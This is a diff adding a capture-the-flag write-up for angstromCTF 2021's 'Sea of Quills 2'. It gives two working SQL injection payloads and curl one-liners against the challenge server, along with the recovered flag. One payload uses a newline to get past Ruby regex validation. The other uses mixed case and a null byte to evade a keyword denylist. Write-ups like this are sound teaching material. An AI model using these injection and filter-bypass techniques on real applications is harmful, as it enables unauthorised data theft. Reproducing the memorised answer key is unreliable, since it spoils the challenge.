@@ -1,0 +1,27 @@
+=================== Intended Solution ===================
+
+Use the fact that Ruby's regex matching only matches up to newlines. So, you could just have the rest of your payload in the offset field.
+
+
+select %s from quills limit %s offset %s
+
+cols: "* FROM (select 1"
+limit: "1"
+offset: "1\n) UNION SELECT flag FROM flagtable"
+
+=> select * FROM (select 1 from quills limit 1 offset 1\n) UNION SELECT flag FROM flagtable
+
+One-liner:
+	curl -s -X POST "https://seaofquills-two.2021.chall.actf.co/quills" --data $'limit=1&offset=1\n) UNION SELECT flag FROM flagtable&cols=* FROM (select 1'
+
+actf{the_time_we_have_spent_together_riding_through_this_english_denylist_c0776ee734497ca81cbd55ea}
+
+
+=================== Unintended Solution ===================
+Sqlite3 is not case-sensetive by default
+
+Payload
+	* from FlaGTabLe%00
+
+
+curl -s -X POST "https://seaofquills-two.2021.chall.actf.co/quills" --data "limit=1&offset=1&cols=* from FlaGTabLe%00"
